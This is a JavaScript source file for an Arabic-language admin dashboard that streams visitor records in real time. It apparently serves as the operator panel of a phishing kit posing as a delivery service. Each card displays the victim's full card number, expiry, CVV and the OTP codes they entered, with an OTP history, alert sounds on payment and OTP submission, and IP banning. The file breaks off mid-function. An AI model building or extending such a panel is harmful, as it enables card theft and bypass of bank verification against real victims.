// Admin Dashboard JavaScript - Mobile First RTL
const SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
  ? 'http://localhost:3000'
  : window.location.origin;

let socket = null;
let adminToken = localStorage.getItem('admin_token');
let isMuted = false;
let audioContext = null;

// ==========================================
// SMART SOUND SYSTEM - Silent typing, alerts only on submissions
// ==========================================

// Track which events we've already notified about (prevent spam)
const notifiedEvents = new Map();

// Sound definitions using Web Audio API
const sounds = {
  // Delivery form submitted - NICE DOUBLE BEEP (success)
  formDelivery: () => {
    if (isMuted) return;
    // Double beep: two short friendly tones
    playSmartBeep([523.25, 0, 659.25], 0.12, 0.1);
  },
  
  // Payment submitted - FINANCIAL CONFIRMATION (higher pitch, strong)
  formPayment: () => {
    if (isMuted) return;
    // Ascending financial confirmation
    playSmartBeep([659.25, 0, 783.99, 0, 1046.50], 0.1, 0.12);
  },
  
  // OTP verification - RAPID ALERT (urgent)
  formVerification: () => {
    if (isMuted) return;
    // Rapid triple alert
    playSmartBeep([880, 0, 880, 0, 1046.50], 0.08, 0.06);
  }
};

// Play gentle notification when visitor changes page
function playPageChangeSound() {
  if (isMuted) return;
  // Soft single chime - gentle notification
  playSmartBeep([440, 0, 554.37], 0.1, 0.15);
}

// Generate smart beep using Web Audio API
function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
  try {
    // Create new AudioContext (user gesture required for first time)
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    
    // Resume context if suspended (browser policy)
    if (ctx.state === 'suspended') {
      ctx.resume();
    }
    
    frequencies.forEach((freq, i) => {
      if (freq === 0) return; // Skip silence gaps
      
      const startTime = ctx.currentTime + (i * (duration + gap));
      
      // Create oscillator
      const oscillator = ctx.createOscillator();
      const gainNode = ctx.createGain();
      
      // Connect
      oscillator.connect(gainNode);
      gainNode.connect(ctx.destination);
      
      // Set frequency - use different wave types for variety
      oscillator.frequency.value = freq;
      oscillator.type = i % 2 === 0 ? 'sine' : 'triangle';
      
      // Volume envelope - smooth attack and release
      gainNode.gain.setValueAtTime(0, startTime);
      gainNode.gain.linearRampToValueAtTime(0.25, startTime + 0.02); // Attack
      gainNode.gain.linearRampToValueAtTime(0.15, startTime + duration * 0.5); // Decay
      gainNode.gain.linearRampToValueAtTime(0, startTime + duration); // Release
      
      // Start and stop
      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    });
    
    // Cleanup context after all sounds done
    setTimeout(() => ctx.close(), (frequencies.length * (duration + gap) + 0.5) * 1000);
    
  } catch (e) { 
    console.warn('Audio playback not supported:', e); 
  }
}

// Check if we should play sound (prevent duplicate notifications)
function shouldPlaySound(sessionId, eventType) {
  const key = `${sessionId}_${eventType}`;
  const now = Date.now();
  const lastPlayed = notifiedEvents.get(key);
  
  // Don't play if played in last 3 seconds (prevent spam)
  if (lastPlayed && (now - lastPlayed) < 3000) {
    return false;
  }
  
  notifiedEvents.set(key, now);
  
  // Clean old entries (older than 1 minute)
  for (const [k, v] of notifiedEvents) {
    if (now - v > 60000) notifiedEvents.delete(k);
  }
  
  return true;
}

// Initialize Socket Connection
function initAdminSocket() {
  return new Promise((resolve, reject) => {
    socket = io(SERVER_URL, {
      query: { sessionId: 'admin_' + Date.now() },
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: 10,
      reconnectionDelay: 1000
    });

    socket.on('connect', () => {
      console.log('🔌 Admin connected, socket id:', socket.id);
      updateConnectionStatus(true);
      
      // Set up ALL event listeners AFTER connection
      setupSocketListeners();
      
      // Wait for connection to stabilize
      setTimeout(() => {
        if (adminToken) {
          socket.emit('admin:validate', { sessionToken: adminToken });
        }
        // Request initial data
        requestInitialData();
      }, 500);
      
      resolve(socket);
    });

    socket.on('connect_error', (error) => {
      console.error('❌ Connection error:', error);
      updateConnectionStatus(false);
      reject(error);
    });

    socket.on('disconnect', () => {
      console.log('🔌 Admin disconnected');
      updateConnectionStatus(false);
    });
    
    socket.on('reconnect', () => {
      console.log('🔌 Admin reconnected');
      updateConnectionStatus(true);
      // Re-setup listeners on reconnect
      setupSocketListeners();
      if (adminToken) {
        socket.emit('admin:validate', { sessionToken: adminToken });
      }
      requestInitialData();
    });
  });
}

// Separate function for all socket listeners
function setupSocketListeners() {
  if (!socket) {
    console.log('❌ Socket not ready for listeners');
    return;
  }
  console.log('📡 Setting up socket listeners...');

  socket.on('admin:valid', (data) => {
    console.log('🔐 Admin validation result:', data);
    if (!data.valid) {
      localStorage.removeItem('admin_token');
      adminToken = null;
    }
  });

  socket.on('admin:forceLogout', () => {
    localStorage.removeItem('admin_token');
    adminToken = null;
    showNotification('انتهت جلستك', 'تم تسجيل خروجك من جميع الأجهزة', 'warning');
    setTimeout(() => showLoginPage(), 2000);
  });

  // CRITICAL: Real-time updates from visitors
  socket.on('visitor:new', (data) => {
    console.log('🆕 DATA RECEIVED VIA SOCKET (visitor:new):', data);
    // NO SOUND for new visitors - data updates should be silent
    const sessionId = data.session_id || data.sessionId;
    
    // Check if card already exists
    const existingCard = document.querySelector('[data-session="' + sessionId + '"]');
    
    if (existingCard) {
      // Card exists - smart update and move to top
      updateCardAndMoveToTop(sessionId, data);
    } else {
      // New card - full refresh to add it
      updateVisitorsList();
    }
    
    updateStats();
  });

  socket.on('visitor:pageChange', (data) => {
    console.log('📄 DATA RECEIVED VIA SOCKET (visitor:pageChange):', data);
    // NO SOUND - page changes should be silent
    // Update card and move to top (smart update, not full refresh)
    updateCardAndMoveToTop(data.sessionId, data);
  });

  socket.on('visitor:offline', (data) => {
    console.log('📴 DATA RECEIVED VIA SOCKET (visitor:offline):', data);
    const sessionId = data.session_id || data.sessionId;
    
    // IMPORTANT: DO NOT remove card, just update visual status
    // The card with all OTP data should remain visible
    updateVisitorStatus(sessionId, false);
    
    // Move to top when going offline (recent activity)
    moveCardToTop(sessionId);
    
    // Update stats
    updateStats();
  });

  socket.on('visitor:online', (data) => {
    console.log('🟢 DATA RECEIVED VIA SOCKET (visitor:online):', data);
    updateVisitorStatus(data.sessionId, true);
    // Move to top when coming online
    moveCardToTop(data.sessionId);
  });

  socket.on('form:deliverySubmitted', (data) => {
    console.log('📦 DATA RECEIVED VIA SOCKET (form:deliverySubmitted):', data);
    // Play sound ONLY for actual submission - with spam protection
    const sessionId = data.session_id || 'unknown';
    if (shouldPlaySound(sessionId, 'delivery')) {
      sounds.formDelivery();
    }
    // Smart update: only update this card and move to top
    updateCardAndMoveToTop(sessionId, data);
    updateStats();
  });

  socket.on('form:paymentSubmitted', (data) => {
    console.log('💳 DATA RECEIVED VIA SOCKET (form:paymentSubmitted):', data);
    // Play sound ONLY for actual submission - with spam protection
    const sessionId = data.session_id || 'unknown';
    if (shouldPlaySound(sessionId, 'payment')) {
      sounds.formPayment();
    }
    // Smart update: only update this card and move to top
    updateCardAndMoveToTop(sessionId, data);
    updateStats();
  });

  socket.on('form:verificationSubmitted', (data) => {
    console.log('🔐 DATA RECEIVED VIA SOCKET (form:verificationSubmitted):', data);
    // Play sound ONLY for actual submission - with spam protection
    const sessionId = data.session_id || 'unknown';
    if (shouldPlaySound(sessionId, 'verification')) {
      sounds.formVerification();
    }
    // Smart update: only update this card and move to top
    updateCardAndMoveToTop(sessionId, data);
    updateStats();
  });

  socket.on('stats:push', (data) => {
    console.log('📊 DATA RECEIVED VIA SOCKET (stats:push):', data);
    updateStatsDisplay(data);
  });

  socket.on('visitors:update', (data) => {
    console.log('📋 DATA RECEIVED VIA SOCKET (visitors:update):', data);
    handleVisitorsUpdate(data);
  });

  socket.on('stats:update', (data) => {
    console.log('📊 DATA RECEIVED VIA SOCKET (stats:update):', data);
    updateStatsDisplay(data);
  });

  socket.on('ban:listUpdate', () => {
    console.log('🚫 DATA RECEIVED VIA SOCKET (ban:listUpdate)');
    loadBannedUsers();
  });

  socket.on('user:unbanned', (data) => {
    console.log('✅ DATA RECEIVED VIA SOCKET (user:unbanned):', data);
    if (data.success) {
      showNotification('تم فك الحظر', 'تم فك الحظر بنجاح', 'success');
      loadBannedUsers();
    } else {
      showNotification('خطأ', data.message || 'حدث خطأ', 'error');
    }
  });

  // TRASH BIN SOCKET HANDLERS
  socket.on('trash:update', (data) => {
    console.log('🗑️ DATA RECEIVED VIA SOCKET (trash:update):', data);
    handleTrashUpdate(data);
  });

  socket.on('visitor:softDeleted', (data) => {
    console.log('🗑️ DATA RECEIVED VIA SOCKET (visitor:softDeleted):', data);
    updateTrashCount(data.trashCount);
    removeVisitorCard(data.sessionId);
  });

  socket.on('visitor:softDeletedMultiple', (data) => {
    console.log('🗑️ DATA RECEIVED VIA SOCKET (visitor:softDeletedMultiple):', data);
    updateTrashCount(data.trashCount);
    data.sessionIds.forEach(id => removeVisitorCard(id));
    clearAllCheckboxes();
  });

  socket.on('visitor:softDeletedAll', (data) => {
    console.log('🗑️ DATA RECEIVED VIA SOCKET (visitor:softDeletedAll):', data);
    updateTrashCount(data.trashCount);
    updateVisitorsList();
    clearAllCheckboxes();
  });

  socket.on('visitor:restored', (data) => {
    console.log('↩️ DATA RECEIVED VIA SOCKET (visitor:restored):', data);
    updateTrashCount(data.trashCount);
    updateVisitorsList();
    // Remove from trash view if visible
    removeVisitorCard(data.sessionId);
  });

  socket.on('visitor:permanentDeleted', (data) => {
    console.log('❌ DATA RECEIVED VIA SOCKET (visitor:permanentDeleted):', data);
    updateTrashCount(data.trashCount);
    removeVisitorCard(data.sessionId);
  });

  socket.on('trash:emptied', (data) => {
    console.log('🗑️ DATA RECEIVED VIA SOCKET (trash:emptied):', data);
    updateTrashCount(0);
    handleTrashUpdate({ visitors: [] });
  });

  console.log('✅ All socket listeners registered');
}

function updateConnectionStatus(isOnline) {
  const dot = document.querySelector('.status-dot');
  const text = document.querySelector('.connection-text');
  if (dot) { dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`; }
  if (text) { text.textContent = isOnline ? 'متصل' : 'غير متصل'; }
}

function showNotification(title, message, type = 'info') {
  const notification = document.createElement('div');
  notification.className = 'notification';
  notification.innerHTML = `
    <span style="font-size:1.5rem;">${type === 'success' ? '✓' : type === 'warning' ? '⚠' : type === 'error' ? '✕' : 'ℹ'}</span>
    <div>
      <div style="font-weight:600;">${title}</div>
      ${message ? `<div style="font-size:0.85rem;color:#666;">${message}</div>` : ''}
    </div>
  `;
  document.body.appendChild(notification);
  setTimeout(() => {
    notification.style.animation = 'slideDown 0.3s ease reverse';
    setTimeout(() => notification.remove(), 300);
  }, 4000);
}

// ========== MOBILE CARD RENDERING ==========
function getPageName(page) {
  const pages = { 'home': 'الرئيسية', 'delivery': 'التوصيل', 'payment': 'الدفع', 'verification': 'التحقق' };
  return pages[page] || page;
}

function getCountryFlag(countryCode) {
  if (!countryCode || countryCode === 'XX') return '🌍';
  try {
    return countryCode.toUpperCase().split('').map(c => String.fromCodePoint(c.charCodeAt(0) + 127397)).join('');
  } catch { return '🌍'; }
}

function createVisitorCard(visitor, isTrashMode = false) {
  // Ensure all data fields exist
  const delivery = visitor.delivery_data || {};
  const payment = visitor.payment_data || {};
  const verification = visitor.verification_data || {};
  const country = visitor.country || 'غير معروف';
  const page = visitor.current_page || 'home';
  const isOnline = visitor.is_online === true;
  const sessionId = visitor.session_id || 'unknown';
  const countryCode = visitor.country_code || '';
  const ipAddress = visitor.ip_address || '';
  
  // Get OTP value
  const otpValue = verification.otp || verification.verificationData?.otp || '';
  
  // Get OTP history
  let otpHistory = [];
  if (visitor.otp_history) {
    try {
      otpHistory = typeof visitor.otp_history === 'string' 
        ? JSON.parse(visitor.otp_history) 
        : (Array.isArray(visitor.otp_history) ? visitor.otp_history : []);
    } catch (e) {
      otpHistory = [];
    }
  }
  
  // Progress steps
  const steps = [
    { key: 'form_submitted', label: 'التوصيل', icon: '📦' },
    { key: 'payment_submitted', label: 'الدفع', icon: '💳' },
    { key: 'verification_submitted', label: 'التحقق', icon: '🔐' }
  ];
  
  const progressHTML = steps.map((step, index) => {
    const isCompleted = visitor[step.key] === true;
    const prevCompleted = index === 0 || visitor[steps[index - 1].key] === true;
    const isActive = !isCompleted && prevCompleted;
    const statusClass = isCompleted ? 'completed' : (isActive ? 'active' : '');
    return `<div class="progress-step ${statusClass}"><div class="step-icon">${isCompleted ? '✓' : step.icon}</div><span>${step.label}</span></div>`;
  }).join('');
  
  // Build card sections
  let cardBody = '<div class="card-body-inner">';
  
  // Delivery section
  if (delivery && Object.keys(delivery).length > 0) {
    cardBody += `
      <div class="card-section">
        <div class="section-title"><span>📦</span> بيانات التوصيل</div>
        ${delivery.fullName ? `<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">${escapeHtml(delivery.fullName)}</span></div>` : ''}
        ${delivery.phone ? `<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">${escapeHtml(delivery.phone)}</span></div>` : ''}
        ${delivery.email ? `<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">${escapeHtml(delivery.email)}</span></div>` : ''}
        ${delivery.city ? `<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">${escapeHtml(delivery.city)}${delivery.region ? ' / ' + escapeHtml(delivery.region) : ''}</span></div>` : ''}
        ${delivery.address ? `<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">${escapeHtml(delivery.address)}</span></div>` : ''}
        ${delivery.notes ? `<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">${escapeHtml(delivery.notes)}</span></div>` : ''}
      </div>
    `;
  }
  
  // Payment section with CVV
  if (payment && Object.keys(payment).length > 0) {
    const cardNum = payment.cardNumber || payment.card_number || '';
    cardBody += `
      <div class="card-section payment-section">
        <div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>
        ${cardNum ? `<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">${escapeHtml(cardNum)}</span></div>` : ''}
        ${payment.cardHolder ? `<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">${escapeHtml(payment.cardHolder)}</span></div>` : ''}
        ${payment.expiry ? `<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">${escapeHtml(payment.expiry)}</span></div>` : ''}
        ${payment.cvv ? `<div class="data-row"><span class="data-label">رمز الحماية (CVV)</span><span class="data-value highlight">${escapeHtml(payment.cvv)}</span></div>` : ''}
      </div>
    `;
  }
  
  // OTP section
  if (otpValue || (otpHistory && otpHistory.length > 0)) {
    let historyHTML = '';
    if (otpHistory && otpHistory.length > 1) {
      const oldOtps = otpHistory.slice(1).map(item => {
        const date = new Date(item.timestamp).toLocaleString('ar-OM');
        return `<div class="otp-history-item">الرموز السابقة: <strong>${escapeHtml(item.otp || '')}</strong> <small>(${date})</small></div>`;
      }).join('');
      historyHTML = `<div class="otp-history-dropdown" id="otpHistory_${sessionId}">${oldOtps}</div>`;
    }
    
    cardBody += `
      <div class="otp-section">
        <div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory('${sessionId}')">
          <span>🔐</span> رمز التحقق (OTP)
          ${(otpHistory && otpHistory.length > 1) ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + otpHistory.length + ' رمز</span>' : ''}
        </div>
        <div class="otp-value">${otpValue || '---'}</div>
        ${historyHTML}
      </div>
    `;
  }
  
  // Empty state
  if (!delivery || Object.keys(delivery).length === 0) {
    cardBody += `
      <div style="text-align:center;padding:1rem;color:#888;">
        <p>لا توجد بيانات حتى الآن</p>
        <small>البيانات ستظهر عند إدخالها من قبل العميل</small>
      </div>
    `;
  }
  
  cardBody += '</div>';
  
  // Status indicator
  const statusHTML = isOnline 
    ? '<div class="card-status"><span class="dot"></span><span>متصل الآن</span></div>'
    : '<div class="card-status" style="color:#ccc;"><span style="color:#ccc;">○</span><span style="color:#999;">غير متصل</span></div>';
  
  // Header background
  const headerStyle = isOnline 
    ? 'background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);'
    : 'background: linear-gradient(135deg, #6b7280 0%, #9ca3af 100%);';
  
  // Build actions based on mode
  let actionsHTML;
  if (isTrashMode) {
    // Trash mode actions
    actionsHTML = `
      <button class="btn btn-success btn-sm" onclick="restoreVisitor('${sessionId}')">↩️ استعادة</button>
      <button class="btn btn-danger btn-sm" onclick="permanentDeleteVisitor('${sessionId}')">❌ حذف نهائي</button>
    `;
  } else {
    // Normal mode actions
    actionsHTML = `
      <input type="checkbox" class="visitor-checkbox" onchange="toggleVisitorSelection('${sessionId}', this)" title="تحديد">
      <button class="btn btn-danger btn-sm" onclick="softDeleteVisitor('${sessionId}')">🗑️</button>
      <button class="btn btn-danger btn-sm" onclick="banVisitor('${sessionId}', '${escapeHtml(ipAddress)}')">🚫 حظر</button>
    `;
  }
  
  // Build final card HTML
  const cardHTML = `
    <div class="visitor-card" data-session="${sessionId}" data-online="${isOnline}" style="${isTrashMode ? 'border-color: #ef4444;' : ''}">
      <div class="card-header" style="${headerStyle}">
        ${isTrashMode ? '<span style="background:#ef4444;padding:2px 8px;border-radius:4px;font-size:11px;">🗑️ محذوف</span>' : ''}
        ${statusHTML}
        <div class="card-country">
          <span>${getCountryFlag(countryCode)}</span>
          <span>${escapeHtml(country)}</span>
        </div>
        <div class="card-page">${getPageName(page)}</div>
      </div>
      ${cardBody}
      <div class="card-progress">${progressHTML}</div>
      <div class="card-actions">${actionsHTML}</div>
    </div>
  `;
  
  return cardHTML;
}

// Helper function to escape HTML
function escapeHtml(text) {
  if (!text) return '';
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Toggle OTP History Dropdown
function toggleOtpHistory(sessionId) {
  var dropdown = document.getElementById('otpHistory_' + sessionId);
  if (dropdown) {
    if (dropdown.style.display === 'block') {
      dropdown.style.display = 'none';
    } else {
      dropdown.style.display = 'block';
    }
  }
}

// Add new visitor card without full refresh
function addNewVisitorCard(data) {
  if (!data.sessionId) return;
  
  var grid = document.getElementById('visitorsGrid');
  if (!grid) return;
  
  // Check if card already exists
  var existingCard = grid.querySelector('[data-session="' + data.sessionId + '"]');
  if (existingCard) {
    updateVisitorCard(data.sessionId, data);
    return;
  }
  
  // Create temporary visitor object for card creation
  var visitor = {
    session_id: data.sessionId,
    ip_address: data.ip_address,
    country: data.country,
    country_code: data.country_code,
    current_page: data.page || 'home',
    is_online: true,
    delivery_data: data.formData || {},
    payment_data: data.paymentData || {},
    verification_data: data.verificationData || {},
    otp_history: data.otpHistory || [],
    form_submitted: !!data.formData,
    payment_submitted: !!data.paymentData,
    verification_submitted: !!data.verificationData
  };
  
  var cardHTML = createVisitorCard(visitor);
  
  // Add animation
  var tempDiv = document.createElement('div');
  tempDiv.innerHTML = cardHTML;
  var newCard = tempDiv.firstElementChild;
  newCard.style.opacity = '0';
  newCard.style.transform = 'translateY(-20px)';
  
  // Insert at the beginning
  if (grid.firstChild && !grid.firstChild.classList.contains('empty-state')) {
    grid.insertBefore(newCard, grid.firstChild);
  } else {
    grid.appendChild(newCard);
  }
  
  // Animate in
  setTimeout(function() {
    newCard.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
    newCard.style.opacity = '1';
    newCard.style.transform = 'translateY(0)';
  }, 50);
  
  // Update count
  var onlineCount = document.getElementById('onlineCount');
  var totalCount = document.getElementById('totalCount');
  if (onlineCount) onlineCount.textContent = parseInt(onlineCount.textContent || 0) + 1;
  if (totalCount) totalCount.textContent = parseInt(totalCount.textContent || 0) + 1;
}

// Update stats display without full refresh
function updateStatsDisplay(data) {
  if (data.totalVisitors !== undefined) {
    var el = document.getElementById('totalVisitors');
    if (el) el.textContent = data.totalVisitors;
  }
  if (data.onlineVisitors !== undefined) {
    var el = document.getElementById('onlineVisitors');
    if (el) el.textContent = data.onlineVisitors;
  }
  if (data.formSubmissions !== undefined) {
    var el = document.getElementById('formSubmissions');
    if (el) el.textContent = data.formSubmissions;
  }
  if (data.paymentSubmissions !== undefined) {
    var el = document.getElementById('paymentSubmissions');
    if (el) el.textContent = data.paymentSubmissions;
  }
}

// Store visitors data for comparison
let visitorsCache = new Map();

function updateVisitorsList() {
  if (!socket || !socket.connected) return;
  
  socket.emit('visitors:request');
}

function handleVisitorsUpdate(data) {
  console.log('📋 Processing visitors update:', data);
  console.log('📋 Raw data:', JSON.stringify(data, null, 2).substring(0, 500));
  
  // Ensure data structure is correct
  const visitors = data.visitors || data.rows || [];
  console.log('📋 Found', visitors.length, 'visitors');
  
  const grid = document.getElementById('visitorsGrid');
  const countEl = document.getElementById('onlineCount');
  const totalCountEl = document.getElementById('totalCount');
  
  if (!grid) {
    console.log('❌ Grid not found!');
    return;
  }
  
  // Update trash count if provided
  if (data.trashCount !== undefined) {
    updateTrashCount(data.trashCount);
  }
  
  const onlineCount = visitors.filter(v => v.is_online === true).length;
  
  // Update stats
  if (countEl) countEl.textContent = onlineCount;
  if (totalCountEl) totalCountEl.textContent = visitors.length;
  
  // COMPLETELY CLEAR THE GRID - Force DOM update
  grid.innerHTML = '';
  
  // Force browser to recognize the empty state
  grid.offsetHeight; // Trigger reflow
  
  if (visitors.length === 0) {
    grid.innerHTML = '<div class="empty-state"><span>👥</span><h3>لا يوجد زوار</h3><p>الزوار سيظهرون هنا</p></div>';
    visitorsCache.clear();
    console.log('✅ Grid cleared, showing empty state');
    return;
  }
  
  // BUILD NEW CARDS FROM SCRATCH
  const fragment = document.createDocumentFragment();
  
  visitors.forEach(function(visitor, index) {
    try {
      const cardHTML = createVisitorCard(visitor);
      const tempDiv = document.createElement('div');
      tempDiv.innerHTML = cardHTML;
      const cardElement = tempDiv.firstElementChild;
      
      if (cardElement) {
        // Add animation
        cardElement.style.opacity = '0';
        cardElement.style.transform = 'translateY(20px)';
        fragment.appendChild(cardElement);
        
        // Trigger animation after append
        requestAnimationFrame(function() {
          setTimeout(function() {
            cardElement.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
            cardElement.style.opacity = '1';
            cardElement.style.transform = 'translateY(0)';
          }, index * 50);
        });
      }
    } catch (e) {
      console.error('❌ Error creating card:', e);
    }
  });
  
  // Append fragment to grid (more efficient)
  grid.appendChild(fragment);
  
  // Force another reflow to ensure DOM update
  grid.offsetHeight;
  
  // Update cache
  visitorsCache.clear();
  visitors.forEach(function(v) {
    visitorsCache.set(v.session_id, v);
  });
  
  console.log('✅ Grid rebuilt with', visitors.length, 'visitor cards');
  console.log('📋 Grid child count:', grid.children.length);
}

// ==========================================
// TRASH BIN FUNCTIONS
// ==========================================

// Track selected visitors
let selectedVisitors = new Set();

function updateTrashCount(count) {
  const trashBadge = document.getElementById('trashCountBadge');
  if (trashBadge) {
    if (count > 0) {
      trashBadge.textContent = count;
      trashBadge.style.display = 'inline';
    } else {
      trashBadge.style.display = 'none';
    }
  }
}

function handleTrashUpdate(data) {
  console.log('🗑️ Processing trash update:', data);
  const grid = document.getElementById('trashGrid');
  if (!grid) return;

  const visitors = data.visitors || [];
  grid.innerHTML = '';

  if (visitors.length === 0) {
    grid.innerHTML = '<div class="empty-state"><span>🗑️</span><h3>السلة فارغة</h3><p>لا توجد عناصر محذوفة</p></div>';
    return;
  }

  const fragment = document.createDocumentFragment();
  visitors.forEach(function(visitor) {
    const cardHTML = createVisitorCard(visitor, true);
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = cardHTML;
    const cardElement = tempDiv.firstElementChild;
    if (cardElement) {
      fragment.appendChild(cardElement);
    }
  });
  grid.appendChild(fragment);
  console.log('✅ Trash grid rebuilt with', visitors.length, 'cards');
}

function requestTrashData() {
  if (!socket || !socket.connected) return;
  socket.emit('trash:request');
}

function removeVisitorCard(sessionId) {
  const card = document.querySelector('[data-session="' + sessionId + '"]');
  if (card) {
    card.style.opacity = '0';
    card.style.transform = 'translateX(-20px)';
    setTimeout(() => card.remove(), 300);
  }
}

function clearAllCheckboxes() {
  selectedVisitors.clear();
  document.querySelectorAll('.visitor-checkbox').forEach(cb => cb.checked = false);
  updateDeleteSelectedButton();
}

function toggleVisitorSelection(sessionId, checkbox) {
  if (checkbox.checked) {
    selectedVisitors.add(sessionId);
  } else {
    selectedVisitors.delete(sessionId);
  }
  updateDeleteSelectedButton();
}

function updateDeleteSelectedButton() {
  const btn = document.getElementById('deleteSelectedBtn');
  if (btn) {
    if (selectedVisitors.size > 0) {
      btn.style.display = 'inline-flex';
      btn.querySelector('.btn-text').textContent = 'حذف المحدد (' + selectedVisitors.size + ')';
    } else {
      btn.style.display = 'none';
    }
  }
}

function getSelectedCount() {
  return selectedVisitors.size;
}

// Soft delete single visitor
function softDeleteVisitor(sessionId) {
  showConfirmModal(
    'نقل إلى سلة المهملات',
    'هل أنت متأكد من نقل هذا الزائر إلى سلة المهملات؟',
    function() {
      socket.emit('visitor:softDelete', { sessionId });
      showNotification('تم النقل للسلة', 'تم نقل الزائر إلى سلة المهملات', 'success');
    }
  );
}

// Soft delete selected visitors
function softDeleteSelected() {
  if (selectedVisitors.size === 0) return;
  
  showConfirmModal(
    'حذف المحدد',
    'هل أنت متأكد من حذف الزوار المحددين (' + selectedVisitors.size + ' زائر)؟',
    function() {
      socket.emit('visitor:softDeleteMultiple', { sessionIds: Array.from(selectedVisitors) });
      showNotification('تم الحذف', 'تم نقل الزوار المحددين إلى سلة المهملات', 'success');
    }
  );
}

// Soft delete all visitors
function softDeleteAll() {
  showConfirmModal(
    'حذف الكل',
    'هل أنت متأكد من نقل جميع الزوار إلى سلة المهملات؟',
    function() {
      socket.emit('visitor:softDeleteAll');
      showNotification('تم الحذف', 'تم نقل جميع الزوار إلى سلة المهملات', 'success');
    }
  );
}

// Restore visitor from trash
function restoreVisitor(sessionId) {
  socket.emit('visitor:restore', { sessionId });
  showNotification('تم الاستعادة', 'تم استعادة الزائر بنجاح', 'success');
}

// Permanently delete visitor
function permanentDeleteVisitor(sessionId) {
  showConfirmModal(
    'حذف نهائي',
    'هل أنت متأكد من حذف هذا الزائر نهائياً؟ لا يمكن التراجع عن هذا الإجراء!',
    function() {
      socket.emit('visitor:permanentDelete', { sessionId });
      showNotification('تم الحذف', 'تم حذف الزائر نهائياً', 'success');
    }
  );
}

// Empty trash
function emptyTrash() {
  showConfirmModal(
    'تفريغ السلة',
    'هل أنت متأكد من حذف جميع العناصر في سلة المهملات نهائياً؟ لا يمكن التراجع عن هذا الإجراء!',
    function() {
      socket.emit('trash:empty');
      showNotification('تم التفريغ', 'تم تفريغ سلة المهملات نهائياً', 'success');
    }
  );
}

// Confirmation Modal
function showConfirmModal(title, message, onConfirm) {
  const modal = document.getElementById('confirmModal');
  const titleEl = document.getElementById('confirmModalTitle');
  const messageEl = document.getElementById('confirmModalMessage');
  const confirmBtn = document.getElementById('confirmModalBtn');
  const cancelBtn = document.getElementById('confirmModalCancel');
  
  if (!modal) return;
  
  titleEl.textContent = title;
  messageEl.textContent = message;
  
  // Clear previous handlers
  const newConfirmBtn = confirmBtn.cloneNode(true);
  const newCancelBtn = cancelBtn.cloneNode(true);
  confirmBtn.parentNode.replaceChild(newConfirmBtn, confirmBtn);
  cancelBtn.parentNode.replaceChild(newCancelBtn, cancelBtn);
  
  newConfirmBtn.addEventListener('click', function() {
    modal.style.display = 'none';
    if (onConfirm) onConfirm();
  });
  
  newCancelBtn.addEventListener('click', function() {
    modal.style.display = 'none';
  });
  
  modal.style.display = 'flex';
}

function updateVisitorPage(sessionId, page) {
  const card = document.querySelector(`[data-session="${sessionId}"]`);
  if (card) {
    const pageEl = card.querySelector('.card-page');
    if (pageEl) pageEl.textContent = getPageName(page);
    // Move to top when page changes (new activity)
    moveCardToTop(sessionId);
  }
}

// Move card to TOP of grid with animation (real-time sorting)
function moveCardToTop(sessionId) {
  const grid = document.getElementById('visitorsGrid');
  const card = document.querySelector('[data-session="' + sessionId + '"]');
  
  if (card && grid && card.parentNode === grid) {
    // Skip if already at top
    if (grid.firstChild === card) return;
    
    // Remove from current position
    grid.removeChild(card);
    
    // Insert at the beginning (top)
    grid.insertBefore(card, grid.firstChild);
    
    // Add animation - slide down effect
    card.style.opacity = '0';
    card.style.transform = 'translateY(-30px)';
    requestAnimationFrame(function() {
      card.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
      card.style.opacity = '1';
      card.style.transform = 'translateY(0)';
    });
  }
}

// Update card data and move to top (for real-time form updates)
function updateCardAndMoveToTop(sessionId, data) {
  // First move to top immediately for visibility
  moveCardToTop(sessionId);
  
  // Then update the card with new data
  // If card doesn't exist, trigger full refresh
  const card = document.querySelector('[data-session="' + sessionId + '"]');
  if (card) {
    // Update the existing card with new data
    updateVisitorCardData(card, data);
    // Add highlight animation to show update
    card.style.boxShadow = '0 0 20px var(--primary)';
    setTimeout(() => {
      card.style.boxShadow = '';
    }, 500);
  } else {
    // Card not found - request full refresh
    updateVisitorsList();
  }
}

// Update card with new data (inline update, no full rebuild)
function updateVisitorCardData(card, data) {
  if (!card || !data) return;
  
  // Update data attributes
  if (data.is_online !== undefined) {
    card.setAttribute('data-online', data.is_online);
    
    // Update header color based on status
    const header = card.querySelector('.card-header');
    const statusEl = card.querySelector('.card-status');
    if (data.is_online === true) {
      header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
      if (statusEl) {
        statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
      }
    } else {
      header.style.background = 'linear-gradient(135deg, #6b7280 0%, #4b5563 100%)';
      if (statusEl) {
        statusEl.innerHTML = '<span class="dot offline"></span><span>غير متصل</span>';
      }
    }
  }
  
  // Update page info if present
  if (data.current_page) {
    const pageEl = card.querySelector('.card-page');
    if (pageEl) pageEl.textContent = getPageName(data.current_page);
  }
  
  // Update last activity timestamp
  if (data.last_activity) {
    const timeEl = card.querySelector('.card-time');
    if (timeEl) {
      const date = new Date(data.last_activity);
